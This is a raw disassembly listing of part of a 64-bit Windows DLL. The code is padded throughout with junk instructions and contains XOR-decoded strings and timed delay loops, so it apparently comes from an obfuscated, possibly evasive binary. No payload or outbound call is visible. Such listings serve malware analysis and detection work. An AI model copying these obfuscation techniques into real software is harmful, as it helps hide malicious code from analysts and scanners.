   180001d7c:	4d 89 f6             	mov    %r14,%r14
   180001d7f:	41 5b                	pop    %r11
   180001d81:	4d 8d 12             	lea    (%r10),%r10
   180001d84:	48 8d 36             	lea    (%rsi),%rsi
   180001d87:	b8 01 00 00 00       	mov    $0x1,%eax
   180001d8c:	48 81 c4 48 02 00 00 	add    $0x248,%rsp
   180001d93:	c3                   	ret
   180001d94:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001d9b:	00 00 00 00 00 
   180001da0:	56                   	push   %rsi
   180001da1:	57                   	push   %rdi
   180001da2:	48 83 ec 28          	sub    $0x28,%rsp
   180001da6:	89 ce                	mov    %ecx,%esi
   180001da8:	31 c9                	xor    %ecx,%ecx
   180001daa:	ba 01 00 00 00       	mov    $0x1,%edx
   180001daf:	45 31 c0             	xor    %r8d,%r8d
   180001db2:	45 31 c9             	xor    %r9d,%r9d
   180001db5:	ff 15 2d 42 02 00    	call   *0x2422d(%rip)        # 0x180025fe8
   180001dbb:	48 89 c7             	mov    %rax,%rdi
   180001dbe:	4d 8d 36             	lea    (%r14),%r14
   180001dc1:	e8 4a 04 00 00       	call   0x180002210
   180001dc6:	48 85 ff             	test   %rdi,%rdi
   180001dc9:	74 14                	je     0x180001ddf
   180001dcb:	48 89 f9             	mov    %rdi,%rcx
   180001dce:	89 f2                	mov    %esi,%edx
   180001dd0:	ff 15 f2 44 02 00    	call   *0x244f2(%rip)        # 0x1800262c8
   180001dd6:	48 89 f9             	mov    %rdi,%rcx
   180001dd9:	ff 15 f9 41 02 00    	call   *0x241f9(%rip)        # 0x180025fd8
   180001ddf:	41 50                	push   %r8
   180001de1:	57                   	push   %rdi
   180001de2:	5f                   	pop    %rdi
   180001de3:	41 58                	pop    %r8
   180001de5:	90                   	nop
   180001de6:	48 83 c4 28          	add    $0x28,%rsp
   180001dea:	5f                   	pop    %rdi
   180001deb:	5e                   	pop    %rsi
   180001dec:	e9 8f 10 00 00       	jmp    0x180002e80
   180001df1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001df8:	0f 1f 84 00 00 00 00 
   180001dff:	00 
   180001e00:	50                   	push   %rax
   180001e01:	53                   	push   %rbx
   180001e02:	5b                   	pop    %rbx
   180001e03:	4d 89 c9             	mov    %r9,%r9
   180001e06:	4d 8d 24 24          	lea    (%r12),%r12
   180001e0a:	48 8d 3f             	lea    (%rdi),%rdi
   180001e0d:	48 87 ed             	xchg   %rbp,%rbp
   180001e10:	48 87 c9             	xchg   %rcx,%rcx
   180001e13:	90                   	nop
   180001e14:	90                   	nop
   180001e15:	90                   	nop
   180001e16:	48 87 c9             	xchg   %rcx,%rcx
   180001e19:	48 8d 36             	lea    (%rsi),%rsi
   180001e1c:	4d 87 ff             	xchg   %r15,%r15
   180001e1f:	48 89 ff             	mov    %rdi,%rdi
   180001e22:	41 54                	push   %r12
   180001e24:	4d 87 d2             	xchg   %r10,%r10
   180001e27:	41 5c                	pop    %r12
   180001e29:	48 89 c0             	mov    %rax,%rax
   180001e2c:	4d 89 c0             	mov    %r8,%r8
   180001e2f:	41 50                	push   %r8
   180001e31:	55                   	push   %rbp
   180001e32:	5d                   	pop    %rbp
   180001e33:	41 58                	pop    %r8
   180001e35:	90                   	nop
   180001e36:	4d 8d 3f             	lea    (%r15),%r15
   180001e39:	4d 87 f6             	xchg   %r14,%r14
   180001e3c:	4d 89 db             	mov    %r11,%r11
   180001e3f:	48 8d 12             	lea    (%rdx),%rdx
   180001e42:	c7 44 24 04 46 01 00 	movl   $0x146,0x4(%rsp)
   180001e49:	00 
   180001e4a:	58                   	pop    %rax
   180001e4b:	c3                   	ret
   180001e4c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001e50:	48 87 d2             	xchg   %rdx,%rdx
   180001e53:	48 8d 00             	lea    (%rax),%rax
   180001e56:	4d 89 ff             	mov    %r15,%r15
   180001e59:	4d 8d 09             	lea    (%r9),%r9
   180001e5c:	48 89 ff             	mov    %rdi,%rdi
   180001e5f:	90                   	nop
   180001e60:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001e64:	4d 87 db             	xchg   %r11,%r11
   180001e67:	b8 01 00 00 00       	mov    $0x1,%eax
   180001e6c:	c3                   	ret
   180001e6d:	0f 1f 00             	nopl   (%rax)
   180001e70:	56                   	push   %rsi
   180001e71:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   180001e78:	b9 ec 01 00 00       	mov    $0x1ec,%ecx
   180001e7d:	e8 de 00 00 00       	call   0x180001f60
   180001e82:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180001e87:	ba 04 01 00 00       	mov    $0x104,%edx
   180001e8c:	ff 15 de 42 02 00    	call   *0x242de(%rip)        # 0x180026170
   180001e92:	e8 79 fc ff ff       	call   0x180001b10
   180001e97:	4d 8d 00             	lea    (%r8),%r8
   180001e9a:	90                   	nop
   180001e9b:	e8 60 ff ff ff       	call   0x180001e00
   180001ea0:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   180001ea5:	ff 15 b5 42 02 00    	call   *0x242b5(%rip)        # 0x180026160
   180001eab:	ff 15 0f 42 02 00    	call   *0x2420f(%rip)        # 0x1800260c0
   180001eb1:	89 c6                	mov    %eax,%esi
   180001eb3:	ff 15 df 42 02 00    	call   *0x242df(%rip)        # 0x180026198
   180001eb9:	31 f0                	xor    %esi,%eax
   180001ebb:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001ebf:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180001ec3:	41 57                	push   %r15
   180001ec5:	4d 8d 3f             	lea    (%r15),%r15
   180001ec8:	41 5f                	pop    %r15
   180001eca:	41 54                	push   %r12
   180001ecc:	41 5c                	pop    %r12
   180001ece:	48 8d 05 a5 09 02 00 	lea    0x209a5(%rip),%rax        # 0x18002287a
   180001ed5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001eda:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   180001ee1:	00 
   180001ee2:	4c 8d 05 95 09 02 00 	lea    0x20995(%rip),%r8        # 0x18002287e
   180001ee9:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   180001eee:	31 d2                	xor    %edx,%edx
   180001ef0:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180001ef6:	ff 15 e4 40 02 00    	call   *0x240e4(%rip)        # 0x180025fe0
   180001efc:	48 87 d2             	xchg   %rdx,%rdx
   180001eff:	e8 9c f8 ff ff       	call   0x1800017a0
   180001f04:	c7 44 24 30 64 e1 8e 	movl   $0x8ee164,0x30(%rsp)
   180001f0b:	00 
   180001f0c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180001f10:	4d 8d 3f             	lea    (%r15),%r15
   180001f13:	48 87 d2             	xchg   %rdx,%rdx
   180001f16:	4d 89 c9             	mov    %r9,%r9
   180001f19:	4d 87 ed             	xchg   %r13,%r13
   180001f1c:	50                   	push   %rax
   180001f1d:	4d 89 c9             	mov    %r9,%r9
   180001f20:	4d 87 f6             	xchg   %r14,%r14
   180001f23:	58                   	pop    %rax
   180001f24:	e8 07 f7 ff ff       	call   0x180001630
   180001f29:	48 89 d2             	mov    %rdx,%rdx
   180001f2c:	4d 87 c9             	xchg   %r9,%r9
   180001f2f:	4d 89 ed             	mov    %r13,%r13
   180001f32:	48 8d 09             	lea    (%rcx),%rcx
   180001f35:	4d 87 f6             	xchg   %r14,%r14
   180001f38:	4d 8d 09             	lea    (%r9),%r9
   180001f3b:	41 57                	push   %r15
   180001f3d:	90                   	nop
   180001f3e:	41 5f                	pop    %r15
   180001f40:	4d 89 c9             	mov    %r9,%r9
   180001f43:	41 55                	push   %r13
   180001f45:	41 53                	push   %r11
   180001f47:	41 5b                	pop    %r11
   180001f49:	41 5d                	pop    %r13
   180001f4b:	b8 01 00 00 00       	mov    $0x1,%eax
   180001f50:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   180001f57:	5e                   	pop    %rsi
   180001f58:	c3                   	ret
   180001f59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001f60:	31 d2                	xor    %edx,%edx
   180001f62:	48 ff 25 27 43 02 00 	rex.W jmp *0x24327(%rip)        # 0x180026290
   180001f69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001f70:	48 83 ec 28          	sub    $0x28,%rsp
   180001f74:	b9 51 02 00 00       	mov    $0x251,%ecx
   180001f79:	e8 62 00 00 00       	call   0x180001fe0
   180001f7e:	b9 00 04 00 00       	mov    $0x400,%ecx
   180001f83:	ba 01 00 00 00       	mov    $0x1,%edx
   180001f88:	ff 15 8a 42 02 00    	call   *0x2428a(%rip)        # 0x180026218
   180001f8e:	e8 ed f0 ff ff       	call   0x180001080
   180001f93:	31 c9                	xor    %ecx,%ecx
   180001f95:	ff 15 d5 42 02 00    	call   *0x242d5(%rip)        # 0x180026270
   180001f9b:	4d 87 db             	xchg   %r11,%r11
   180001f9e:	4d 8d 3f             	lea    (%r15),%r15
   180001fa1:	48 89 ed             	mov    %rbp,%rbp
   180001fa4:	48 89 c9             	mov    %rcx,%rcx
   180001fa7:	c7 44 24 24 51 b3 0a 	movl   $0xab351,0x24(%rsp)
   180001fae:	00 
   180001faf:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180001fb3:	48 87 e4             	xchg   %rsp,%rsp
   180001fb6:	90                   	nop
   180001fb7:	90                   	nop
   180001fb8:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001fbc:	48 87 f6             	xchg   %rsi,%rsi
   180001fbf:	4d 87 e4             	xchg   %r12,%r12
   180001fc2:	41 57                	push   %r15
   180001fc4:	41 50                	push   %r8
   180001fc6:	41 58                	pop    %r8
   180001fc8:	41 5f                	pop    %r15
   180001fca:	b8 01 00 00 00       	mov    $0x1,%eax
   180001fcf:	48 83 c4 28          	add    $0x28,%rsp
   180001fd3:	c3                   	ret
   180001fd4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001fdb:	00 00 00 00 00 
   180001fe0:	56                   	push   %rsi
   180001fe1:	57                   	push   %rdi
   180001fe2:	48 83 ec 28          	sub    $0x28,%rsp
   180001fe6:	89 ce                	mov    %ecx,%esi
   180001fe8:	31 c9                	xor    %ecx,%ecx
   180001fea:	ba 01 00 00 00       	mov    $0x1,%edx
   180001fef:	45 31 c0             	xor    %r8d,%r8d
   180001ff2:	45 31 c9             	xor    %r9d,%r9d
   180001ff5:	ff 15 ed 3f 02 00    	call   *0x23fed(%rip)        # 0x180025fe8
   180001ffb:	48 89 db             	mov    %rbx,%rbx
   180001ffe:	4d 89 c0             	mov    %r8,%r8
   180002001:	48 87 ed             	xchg   %rbp,%rbp
   180002004:	48 87 db             	xchg   %rbx,%rbx
   180002007:	4d 8d 1b             	lea    (%r11),%r11
   18000200a:	48 87 e4             	xchg   %rsp,%rsp
   18000200d:	4d 87 ed             	xchg   %r13,%r13
   180002010:	48 85 c0             	test   %rax,%rax
   180002013:	74 17                	je     0x18000202c
   180002015:	48 89 c7             	mov    %rax,%rdi
   180002018:	48 89 c1             	mov    %rax,%rcx
   18000201b:	89 f2                	mov    %esi,%edx
   18000201d:	ff 15 a5 42 02 00    	call   *0x242a5(%rip)        # 0x1800262c8
   180002023:	48 89 f9             	mov    %rdi,%rcx
   180002026:	ff 15 ac 3f 02 00    	call   *0x23fac(%rip)        # 0x180025fd8
   18000202c:	90                   	nop
   18000202d:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180002031:	90                   	nop
   180002032:	90                   	nop
   180002033:	48 83 c4 28          	add    $0x28,%rsp
   180002037:	5f                   	pop    %rdi
   180002038:	5e                   	pop    %rsi
   180002039:	c3                   	ret
   18000203a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180002040:	56                   	push   %rsi
   180002041:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   180002048:	b9 9d 01 00 00       	mov    $0x19d,%ecx
   18000204d:	e8 5e 01 00 00       	call   0x1800021b0
   180002052:	56                   	push   %rsi
   180002053:	48 89 d2             	mov    %rdx,%rdx
   180002056:	4d 87 d2             	xchg   %r10,%r10
   180002059:	5e                   	pop    %rsi
   18000205a:	ff 15 60 40 02 00    	call   *0x24060(%rip)        # 0x1800260c0
   180002060:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002065:	ff 15 95 40 02 00    	call   *0x24095(%rip)        # 0x180026100
   18000206b:	51                   	push   %rcx
   18000206c:	90                   	nop
   18000206d:	59                   	pop    %rcx
   18000206e:	e8 9d 01 00 00       	call   0x180002210
   180002073:	48 8d 0d fa 07 02 00 	lea    0x207fa(%rip),%rcx        # 0x180022874
   18000207a:	ff 15 c8 41 02 00    	call   *0x241c8(%rip)        # 0x180026248
   180002080:	90                   	nop
   180002081:	90                   	nop
   180002082:	48 89 ed             	mov    %rbp,%rbp
   180002085:	90                   	nop
   180002086:	c7 44 24 40 62 c4 ff 	movl   $0xffc462,0x40(%rsp)
   18000208d:	00 
   18000208e:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180002092:	e8 09 f7 ff ff       	call   0x1800017a0
   180002097:	90                   	nop
   180002098:	4d 8d 3f             	lea    (%r15),%r15
   18000209b:	4d 89 e4             	mov    %r12,%r12
   18000209e:	b9 28 01 00 00       	mov    $0x128,%ecx
   1800020a3:	e8 a8 01 00 00       	call   0x180002250
   1800020a8:	48 89 db             	mov    %rbx,%rbx
   1800020ab:	90                   	nop
   1800020ac:	90                   	nop
   1800020ad:	48 89 f6             	mov    %rsi,%rsi
   1800020b0:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   1800020b5:	ff 15 a5 40 02 00    	call   *0x240a5(%rip)        # 0x180026160
   1800020bb:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   1800020c0:	48 89 f1             	mov    %rsi,%rcx
   1800020c3:	ff 15 d7 40 02 00    	call   *0x240d7(%rip)        # 0x1800261a0
   1800020c9:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800020cc:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1800020d1:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800020d6:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1800020dd:	00 
   1800020de:	4c 8d 05 91 07 02 00 	lea    0x20791(%rip),%r8        # 0x180022876
   1800020e5:	31 c9                	xor    %ecx,%ecx
   1800020e7:	31 d2                	xor    %edx,%edx
   1800020e9:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800020ef:	ff 15 db 41 02 00    	call   *0x241db(%rip)        # 0x1800262d0
   1800020f5:	48 89 ed             	mov    %rbp,%rbp
   1800020f8:	48 87 d2             	xchg   %rdx,%rdx
   1800020fb:	4d 87 e4             	xchg   %r12,%r12
   1800020fe:	ff 15 a4 40 02 00    	call   *0x240a4(%rip)        # 0x1800261a8
   180002104:	90                   	nop
   180002105:	4d 8d 24 24          	lea    (%r12),%r12
   180002109:	41 57                	push   %r15
   18000210b:	48 87 db             	xchg   %rbx,%rbx
   18000210e:	4d 89 ff             	mov    %r15,%r15
   180002111:	41 5f                	pop    %r15
   180002113:	c7 44 24 40 c7 3e 01 	movl   $0x13ec7,0x40(%rsp)
   18000211a:	00 
   18000211b:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000211f:	48 87 e4             	xchg   %rsp,%rsp
   180002122:	48 87 ff             	xchg   %rdi,%rdi
   180002125:	48 8d 09             	lea    (%rcx),%rcx
   180002128:	4d 89 e4             	mov    %r12,%r12
   18000212b:	4d 89 c9             	mov    %r9,%r9
   18000212e:	b9 cc 01 00 00       	mov    $0x1cc,%ecx
   180002133:	e8 68 01 00 00       	call   0x1800022a0
   180002138:	53                   	push   %rbx
   180002139:	90                   	nop
   18000213a:	5b                   	pop    %rbx
   18000213b:	ff 15 8f 3f 02 00    	call   *0x23f8f(%rip)        # 0x1800260d0
   180002141:	48 85 c0             	test   %rax,%rax
   180002144:	74 09                	je     0x18000214f
   180002146:	48 89 c1             	mov    %rax,%rcx
   180002149:	ff 15 11 3f 02 00    	call   *0x23f11(%rip)        # 0x180026060
   18000214f:	e8 bc f9 ff ff       	call   0x180001b10
   180002154:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002159:	ff 15 f9 40 02 00    	call   *0x240f9(%rip)        # 0x180026258
   18000215f:	ff 15 43 3f 02 00    	call   *0x23f43(%rip)        # 0x1800260a8
   180002165:	4d 87 c0             	xchg   %r8,%r8
   180002168:	48 8b 35 41 3f 02 00 	mov    0x23f41(%rip),%rsi        # 0x1800260b0
   18000216f:	ff d6                	call   *%rsi
   180002171:	48 87 d2             	xchg   %rdx,%rdx
   180002174:	4d 8d 00             	lea    (%r8),%r8
   180002177:	c7 44 24 40 b4 70 0c 	movl   $0xc70b4,0x40(%rsp)
   18000217e:	00 
   18000217f:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180002183:	e8 88 f3 ff ff       	call   0x180001510
   180002188:	55                   	push   %rbp
   180002189:	48 89 db             	mov    %rbx,%rbx
   18000218c:	5d                   	pop    %rbp
   18000218d:	41 50                	push   %r8
   18000218f:	4d 8d 1b             	lea    (%r11),%r11
   180002192:	41 58                	pop    %r8
   180002194:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180002198:	4d 87 d2             	xchg   %r10,%r10
   18000219b:	90                   	nop
   18000219c:	ff d6                	call   *%rsi
   18000219e:	90                   	nop
   18000219f:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   1800021a6:	5e                   	pop    %rsi
   1800021a7:	c3                   	ret
   1800021a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800021af:	00 
   1800021b0:	56                   	push   %rsi
   1800021b1:	57                   	push   %rdi
   1800021b2:	48 83 ec 28          	sub    $0x28,%rsp
   1800021b6:	89 ce                	mov    %ecx,%esi
   1800021b8:	31 c9                	xor    %ecx,%ecx
   1800021ba:	ba 01 00 00 00       	mov    $0x1,%edx
   1800021bf:	45 31 c0             	xor    %r8d,%r8d
   1800021c2:	45 31 c9             	xor    %r9d,%r9d
   1800021c5:	ff 15 1d 3e 02 00    	call   *0x23e1d(%rip)        # 0x180025fe8
   1800021cb:	41 55                	push   %r13
   1800021cd:	41 5d                	pop    %r13
   1800021cf:	41 52                	push   %r10
   1800021d1:	51                   	push   %rcx
   1800021d2:	59                   	pop    %rcx
   1800021d3:	41 5a                	pop    %r10
   1800021d5:	48 85 c0             	test   %rax,%rax
   1800021d8:	74 17                	je     0x1800021f1
   1800021da:	48 89 c7             	mov    %rax,%rdi
   1800021dd:	48 89 c1             	mov    %rax,%rcx
   1800021e0:	89 f2                	mov    %esi,%edx
   1800021e2:	ff 15 e0 40 02 00    	call   *0x240e0(%rip)        # 0x1800262c8
   1800021e8:	48 89 f9             	mov    %rdi,%rcx
   1800021eb:	ff 15 e7 3d 02 00    	call   *0x23de7(%rip)        # 0x180025fd8
   1800021f1:	4d 8d 24 24          	lea    (%r12),%r12
   1800021f5:	90                   	nop
   1800021f6:	48 89 ed             	mov    %rbp,%rbp
   1800021f9:	90                   	nop
   1800021fa:	48 83 c4 28          	add    $0x28,%rsp
   1800021fe:	5f                   	pop    %rdi
   1800021ff:	5e                   	pop    %rsi
   180002200:	c3                   	ret
   180002201:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180002208:	0f 1f 84 00 00 00 00 
   18000220f:	00 
   180002210:	50                   	push   %rax
   180002211:	4d 8d 24 24          	lea    (%r12),%r12
   180002215:	48 87 ff             	xchg   %rdi,%rdi
   180002218:	41 54                	push   %r12
   18000221a:	48 87 f6             	xchg   %rsi,%rsi
   18000221d:	41 5c                	pop    %r12
   18000221f:	53                   	push   %rbx
   180002220:	5b                   	pop    %rbx
   180002221:	90                   	nop
   180002222:	4d 89 ed             	mov    %r13,%r13
   180002225:	48 87 ff             	xchg   %rdi,%rdi
   180002228:	52                   	push   %rdx
   180002229:	48 89 ed             	mov    %rbp,%rbp
   18000222c:	48 8d 36             	lea    (%rsi),%rsi
   18000222f:	5a                   	pop    %rdx
   180002230:	4d 87 db             	xchg   %r11,%r11
   180002233:	4d 89 f6             	mov    %r14,%r14
   180002236:	53                   	push   %rbx
   180002237:	52                   	push   %rdx
   180002238:	5a                   	pop    %rdx
   180002239:	5b                   	pop    %rbx
   18000223a:	48 87 ff             	xchg   %rdi,%rdi
   18000223d:	c7 44 24 04 8b 02 00 	movl   $0x28b,0x4(%rsp)
   180002244:	00 
   180002245:	58                   	pop    %rax
   180002246:	c3                   	ret
   180002247:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000224e:	00 00 
   180002250:	41 56                	push   %r14
   180002252:	56                   	push   %rsi
   180002253:	57                   	push   %rdi
   180002254:	53                   	push   %rbx
   180002255:	48 83 ec 28          	sub    $0x28,%rsp
   180002259:	89 ce                	mov    %ecx,%esi
   18000225b:	48 8b 1d 36 3f 02 00 	mov    0x23f36(%rip),%rbx        # 0x180026198
   180002262:	ff d3                	call   *%rbx
   180002264:	89 c7                	mov    %eax,%edi
   180002266:	ff d3                	call   *%rbx
   180002268:	29 f8                	sub    %edi,%eax
   18000226a:	39 f0                	cmp    %esi,%eax
   18000226c:	73 1d                	jae    0x18000228b
   18000226e:	4c 8b 35 23 40 02 00 	mov    0x24023(%rip),%r14        # 0x180026298
   180002275:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   18000227c:	00 00 00 00 
   180002280:	41 ff d6             	call   *%r14
   180002283:	ff d3                	call   *%rbx
   180002285:	29 f8                	sub    %edi,%eax
   180002287:	39 f0                	cmp    %esi,%eax
   180002289:	72 f5                	jb     0x180002280
   18000228b:	48 83 c4 28          	add    $0x28,%rsp
   18000228f:	5b                   	pop    %rbx
   180002290:	5f                   	pop    %rdi
   180002291:	5e                   	pop    %rsi
   180002292:	41 5e                	pop    %r14
   180002294:	c3                   	ret
   180002295:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   18000229c:	00 00 00 00 
   1800022a0:	31 d2                	xor    %edx,%edx
   1800022a2:	48 ff 25 e7 3f 02 00 	rex.W jmp *0x23fe7(%rip)        # 0x180026290
   1800022a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1800022b0:	56                   	push   %rsi
   1800022b1:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   1800022b8:	b9 6a 01 00 00       	mov    $0x16a,%ecx
   1800022bd:	e8 fe f5 ff ff       	call   0x1800018c0
   1800022c2:	48 8b 35 3f 3f 02 00 	mov    0x23f3f(%rip),%rsi        # 0x180026208
   1800022c9:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1800022ce:	ff d6                	call   *%rsi
   1800022d0:	48 87 e4             	xchg   %rsp,%rsp
   1800022d3:	41 53                	push   %r11
   1800022d5:	90                   	nop
   1800022d6:	41 5b                	pop    %r11
   1800022d8:	b9 06 00 00 00       	mov    $0x6,%ecx
   1800022dd:	ff d6                	call   *%rsi
   1800022df:	c7 44 24 30 f6 39 1c 	movl   $0x1c39f6,0x30(%rsp)
   1800022e6:	00 
   1800022e7:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800022eb:	90                   	nop
   1800022ec:	48 89 c9             	mov    %rcx,%rcx
   1800022ef:	90                   	nop
   1800022f0:	41 54                	push   %r12
   1800022f2:	41 5c                	pop    %r12
   1800022f4:	41 52                	push   %r10
   1800022f6:	4d 87 ff             	xchg   %r15,%r15
   1800022f9:	41 5a                	pop    %r10
   1800022fb:	e8 a0 f4 ff ff       	call   0x1800017a0
   180002300:	41 54                	push   %r12
   180002302:	48 87 f6             	xchg   %rsi,%rsi
   180002305:	41 5c                	pop    %r12
   180002307:	b9 df 02 00 00       	mov    $0x2df,%ecx
   18000230c:	e8 3f ff ff ff       	call   0x180002250
   180002311:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   180002318:	00 
   180002319:	8b 44 24 20          	mov    0x20(%rsp),%eax
   18000231d:	83 f0 52             	xor    $0x52,%eax
   180002320:	66 89 44 24 26       	mov    %ax,0x26(%rsp)
   180002325:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002329:	83 f0 43             	xor    $0x43,%eax
   18000232c:	66 89 44 24 28       	mov    %ax,0x28(%rsp)
   180002331:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002335:	83 f0 56             	xor    $0x56,%eax
   180002338:	66 89 44 24 2a       	mov    %ax,0x2a(%rsp)
   18000233d:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002341:	83 f0 4a             	xor    $0x4a,%eax
   180002344:	66 89 44 24 2c       	mov    %ax,0x2c(%rsp)
   180002349:	66 c7 44 24 2e 00 00 	movw   $0x0,0x2e(%rsp)
   180002350:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   180002355:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000235a:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002360:	ff 15 72 3d 02 00    	call   *0x23d72(%rip)        # 0x1800260d8
   180002366:	48 8d 00             	lea    (%rax),%rax
   180002369:	4d 89 e4             	mov    %r12,%r12
   18000236c:	4d 89 c0             	mov    %r8,%r8
   18000236f:	4d 87 ff             	xchg   %r15,%r15
   180002372:	e8 c9 00 00 00       	call   0x180002440
   180002377:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000237c:	b9 04 01 00 00       	mov    $0x104,%ecx
   180002381:	ff 15 19 3d 02 00    	call   *0x23d19(%rip)        # 0x1800260a0
   180002387:	90                   	nop
   180002388:	4d 87 db             	xchg   %r11,%r11
   18000238b:	41 55                	push   %r13
   18000238d:	48 89 e4             	mov    %rsp,%rsp
   180002390:	4d 87 c0             	xchg   %r8,%r8
   180002393:	41 5d                	pop    %r13
   180002395:	c7 44 24 30 9d 15 8e 	movl   $0x8e159d,0x30(%rsp)
   18000239c:	00 
   18000239d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800023a1:	57                   	push   %rdi
   1800023a2:	41 52                	push   %r10
   1800023a4:	41 5a                	pop    %r10
   1800023a6:	5f                   	pop    %rdi
   1800023a7:	41 53                	push   %r11
   1800023a9:	41 5b                	pop    %r11
   1800023ab:	b9 74 03 00 00       	mov    $0x374,%ecx
   1800023b0:	e8 fb fd ff ff       	call   0x1800021b0
   1800023b5:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800023b9:	48 87 c9             	xchg   %rcx,%rcx
   1800023bc:	48 89 ff             	mov    %rdi,%rdi
   1800023bf:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800023c4:	ba 04 01 00 00       	mov    $0x104,%edx
   1800023c9:	ff 15 e9 3d 02 00    	call   *0x23de9(%rip)        # 0x1800261b8
   1800023cf:	41 53                	push   %r11
   1800023d1:	4d 87 e4             	xchg   %r12,%r12
   1800023d4:	41 5b                	pop    %r11
   1800023d6:	52                   	push   %rdx
   1800023d7:	4d 8d 24 24          	lea    (%r12),%r12
   1800023db:	4d 87 c0             	xchg   %r8,%r8
   1800023de:	5a                   	pop    %rdx
   1800023df:	ff 15 d3 3c 02 00    	call   *0x23cd3(%rip)        # 0x1800260b8
   1800023e5:	48 89 e4             	mov    %rsp,%rsp
   1800023e8:	4d 89 ff             	mov    %r15,%r15
   1800023eb:	48 87 c9             	xchg   %rcx,%rcx
   1800023ee:	90                   	nop
   1800023ef:	c7 44 24 30 97 76 27 	movl   $0x277697,0x30(%rsp)
   1800023f6:	00 
   1800023f7:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800023fb:	90                   	nop
   1800023fc:	4d 87 c0             	xchg   %r8,%r8
   1800023ff:	48 87 db             	xchg   %rbx,%rbx
   180002402:	48 87 ff             	xchg   %rdi,%rdi
   180002405:	90                   	nop
   180002406:	48 87 c9             	xchg   %rcx,%rcx
   180002409:	90                   	nop
   18000240a:	41 54                	push   %r12
   18000240c:	41 5c                	pop    %r12
   18000240e:	90                   	nop
   18000240f:	48 89 ed             	mov    %rbp,%rbp
   180002412:	48 89 d2             	mov    %rdx,%rdx
   180002415:	4d 87 f6             	xchg   %r14,%r14
   180002418:	4d 87 c0             	xchg   %r8,%r8
   18000241b:	4d 87 ff             	xchg   %r15,%r15
   18000241e:	48 89 ed             	mov    %rbp,%rbp
   180002421:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180002426:	b9 04 01 00 00       	mov    $0x104,%ecx
   18000242b:	ff 15 57 3d 02 00    	call   *0x23d57(%rip)        # 0x180026188
   180002431:	90                   	nop
   180002432:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   180002439:	5e                   	pop    %rsi
   18000243a:	c3                   	ret
   18000243b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002440:	50                   	push   %rax
   180002441:	41 57                	push   %r15
   180002443:	48 8d 12             	lea    (%rdx),%rdx
   180002446:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   18000244a:	41 5f                	pop    %r15
   18000244c:	90                   	nop
   18000244d:	4d 8d 09             	lea    (%r9),%r9
   180002450:	48 89 c9             	mov    %rcx,%rcx
   180002453:	48 87 f6             	xchg   %rsi,%rsi
   180002456:	48 89 ed             	mov    %rbp,%rbp
   180002459:	48 89 c0             	mov    %rax,%rax
   18000245c:	4d 89 db             	mov    %r11,%r11
   18000245f:	48 89 f6             	mov    %rsi,%rsi
   180002462:	4d 89 ff             	mov    %r15,%r15
   180002465:	48 87 e4             	xchg   %rsp,%rsp
